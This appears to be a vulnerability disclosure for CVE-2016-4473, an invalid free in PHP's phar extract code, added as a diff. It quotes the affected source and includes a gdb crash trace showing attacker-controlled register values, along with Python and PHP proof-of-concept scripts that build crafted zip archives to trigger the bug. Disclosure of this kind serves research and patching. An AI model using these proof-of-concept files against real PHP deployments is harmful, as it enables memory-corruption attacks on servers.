@@ -1,0 +1,177 @@
+An invalid free (assigned CVE-2016-4473) may occur under certain
+conditions when processing phar-compatible archives in php 5.6.22, 7.0.7
+and git head:
+
+php-7.0.7/ext/phar/phar_object.c
+#+begin_src c
+4063 static int phar_extract_file(zend_bool overwrite, phar_entry_info *entry, char *dest, int dest_len, char **error) /* {{{ */
+4064 {
+....
+4071     cwd_state new_state;
+....
+4084     new_state.cwd = (char*)emalloc(2);                                                                               // (ref:1)
+4085     new_state.cwd[0] = DEFAULT_SLASH;
+4086     new_state.cwd[1] = '\0';
+4087     new_state.cwd_length = 1;
+4088     if (virtual_file_ex(&new_state, entry->filename, NULL, CWD_EXPAND) != 0 ||
+4089             new_state.cwd_length <= 1) {
+....
+4099     }
+....
+4163
+4164     if (FAILURE == php_stream_stat_path(fullpath, &ssb)) {
+4165         if (entry->is_dir) {
+4166             if (!php_stream_mkdir(fullpath, entry->flags & PHAR_ENT_PERM_MASK,  PHP_STREAM_MKDIR_RECURSIVE, NULL)) { // (ref:2)
+....
+4169                 free(new_state.cwd);                                                                                 // (ref:3)
+....
+4171             }
+4172         } else {
+4173             if (!php_stream_mkdir(fullpath, 0777,  PHP_STREAM_MKDIR_RECURSIVE, NULL)) {                              // (ref:4)
+....
+4176                 free(new_state.cwd);                                                                                 // (ref:5)
+....
+4178             }
+4179         }
+4180     }
+....
+4246 }
+#+end_src
+
+~new_state.cwd~ is initially allocated through the internal zend
+allocator in ([[(1)]]) and is later reallocated as the file path is resolved
+in ~virtual_file_ex~:
+
+php-7.0.7/Zend/zend_virtual_cwd.c
+#+begin_src c
+1178 CWD_API int virtual_file_ex(cwd_state *state, const char *path, verify_path_func verify_path, int use_realpath) /* {{{ */
+1179 {
+....
+1336     if (verify_path) {
+....
+1342         tmp = erealloc(state->cwd, state->cwd_length+1);
+....
+1349         state->cwd = (char *) tmp;
+1350
+1351         memcpy(state->cwd, resolved_path, state->cwd_length+1);
+....
+1360     } else {
+....
+1362         tmp = erealloc(state->cwd, state->cwd_length+1);
+....
+1369         state->cwd = (char *) tmp;
+1370
+1371         memcpy(state->cwd, resolved_path, state->cwd_length+1);
+....
+1373     }
+....
+1379 }
+#+end_src
+
+However, should ~php_stream_mkdir~ fail in ([[(2)]]) or ([[(4)]]), ~cwd~ is
+freed by the underlying libc allocator in ([[(3)]]) or ([[(5)]]).
+
+On FreeBSD (ie. jemalloc) with mkdir() failing due to a directory
+already existing as a regular file:
+
+#+begin_src sh
+$ python mkzip.py
+$ gdb711 --args php phar.php out/ 1.zip 2.zip
+(gdb) r
+Starting program: /usr/home/php/php/bin/php phar.php out/ 1.zip 2.zip
+
+Warning: PharData::extractTo(): Not a directory in /usr/home/php/phar.php on line 14
+
+Program received signal SIGBUS, Bus error.
+0x00000008025bde2c in __jemalloc_arena_dalloc_bin_locked (arena=<optimized out>, chunk=<optimized out>, ptr=<optimized out>, mapelm=<optimized out>) at jemalloc_arena.c:1717
+
+1717        bin->stats.allocated -= size;
+
+(gdb) bt
+#0  0x00000008025bde2c in __jemalloc_arena_dalloc_bin_locked (arena=<optimized out>, chunk=<optimized out>, ptr=<optimized out>, mapelm=<optimized out>) at jemalloc_arena.c:1717
+#1  0x00000008025be1cf in __jemalloc_arena_dalloc_bin (chunk=<optimized out>, pageind=<optimized out>, mapelm=<optimized out>, arena=<optimized out>, chunk=<optimized out>, ptr=<optimized out>, pageind=<optimized out>, mapelm=<optimized out>) at jemalloc_arena.c:1733
+#2  __jemalloc_arena_dalloc_small (arena=0x4343434343434341, chunk=0x803800000, ptr=0x0, pageind=<optimized out>) at jemalloc_arena.c:1749
+#3  0x00000008025c99c5 in __jemalloc_arena_dalloc (arena=<optimized out>, chunk=<optimized out>, ptr=<optimized out>, try_tcache=<optimized out>, arena=<optimized out>, chunk=<optimized out>, ptr=<optimized out>, try_tcache=<optimized out>) at /usr/src/lib/libc/../../contrib/jemalloc/include/jemalloc/internal/arena.h:1005
+#4  __jemalloc_idallocx (ptr=<optimized out>, try_tcache=<optimized out>, ptr=<optimized out>, try_tcache=<optimized out>) at /usr/src/lib/libc/../../contrib/jemalloc/include/jemalloc/internal/jemalloc_internal.h:913
+#5  __jemalloc_iqallocx (ptr=<optimized out>, try_tcache=<optimized out>, ptr=<optimized out>, try_tcache=<optimized out>) at /usr/src/lib/libc/../../contrib/jemalloc/include/jemalloc/internal/jemalloc_internal.h:932
+#6  __jemalloc_iqalloc (ptr=<optimized out>) at /usr/src/lib/libc/../../contrib/jemalloc/include/jemalloc/internal/jemalloc_internal.h:939
+#7  __free (ptr=0x803879060) at jemalloc_jemalloc.c:1277
+#8  0x0000000000762b93 in phar_extract_file (overwrite=0 '\000', entry=0x803870540, dest=0x803861018 "out/", dest_len=4, error=0x7fffffffc188) at /home/php/php-7.0.7/ext/phar/phar_object.c:4176
+#9  0x0000000000762455 in zim_Phar_extractTo (execute_data=0x803813250, return_value=0x8038131f0) at /home/php/php-7.0.7/ext/phar/phar_object.c:4373
+#10 0x0000000000b19529 in ZEND_DO_FCALL_SPEC_HANDLER (execute_data=0x803813030) at Zend/zend_vm_execute.h:842
+#11 0x0000000000ad22a4 in execute_ex (ex=0x803813030) at Zend/zend_vm_execute.h:417
+#12 0x0000000000ad2da5 in zend_execute (op_array=0x80387b000, return_value=0x0) at Zend/zend_vm_execute.h:458
+#13 0x0000000000a28609 in zend_execute_scripts (type=8, retval=0x0, file_count=3) at /home/php/php-7.0.7/Zend/zend.c:1427
+#14 0x0000000000951045 in php_execute_script (primary_file=0x7fffffffe868) at /home/php/php-7.0.7/main/main.c:2494
+#15 0x0000000000c07896 in do_cli (argc=5, argv=0x7fffffffeb48) at /home/php/php-7.0.7/sapi/cli/php_cli.c:974
+#16 0x0000000000c06419 in main (argc=5, argv=0x7fffffffeb48) at /home/php/php-7.0.7/sapi/cli/php_cli.c:1344
+
+(gdb) x/i $rip
+=> 0x8025bde2c <__jemalloc_arena_dalloc_bin_locked+556 at jemalloc_arena.c:1717>:sub    QWORD PTR [rbx+0x38],rax
+
+(gdb) i r
+rax       0x8                   8
+rbx       0x4141414141414141    4702111234474983745
+rcx       0x42424243            1111638595
+rdx       0x0                   0
+rsi       0x4343434343434343    4846791580151137091
+rdi       0x4343434343434341    4846791580151137089
+rbp       0x7fffffffbd70        0x7fffffffbd70
+rsp       0x7fffffffbd20        0x7fffffffbd20
+r8        0x0                   0
+r9        0x0                   0
+r10       0x803879010           34418954256
+r11       0x8028c12b0           34402472624
+r12       0x0                   0
+r13       0x803879000           34418954240
+r14       0x8028adf44           34402393924
+r15       0x8028c1250           34402472528
+rip       0x8025bde2c           0x8025bde2c <__jemalloc_arena_dalloc_bin_locked+556 at jemalloc_arena.c:1717>
+eflags    0x10206               [ PF IF RF ]
+cs        0x43                  67
+ss        0x3b                  59
+ds        <unavailable>
+es        <unavailable>
+fs        <unavailable>
+gs        <unavailable>
+(gdb)
+#+end_src
+
+
+* mkzip.py
+#+begin_src python
+#!/usr/bin/python
+import zipfile
+
+fname = "AAAAAAAAxxxxBBBBCCCCCCCCxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+
+with zipfile.ZipFile("1.zip", "w") as z:
+    z.writestr(fname, "")
+
+with zipfile.ZipFile("2.zip", "w") as z:
+    z.writestr("%s/b/c" % fname, "")
+#+end_src
+
+
+* phar.php
+#+begin_src php
+<?php
+if ($argc < 3) {
+    echo "ERROR: $argv[0] dst src\n";
+    exit(1);
+}
+
+if (is_dir($argv[1]) !== TRUE) {
+    mkdir($argv[1]) or die("aborting...\n");
+}
+
+for ($i = 2; $i < $argc; $i++) {
+    try {
+        $phar = new PharData($argv[$i]);
+        $phar->extractTo($argv[1]);
+    } catch (Exception $e) {
+        echo "NOTE: " . $e->getMessage() . "\n";
+    }
+}
+?>
+#+end_src
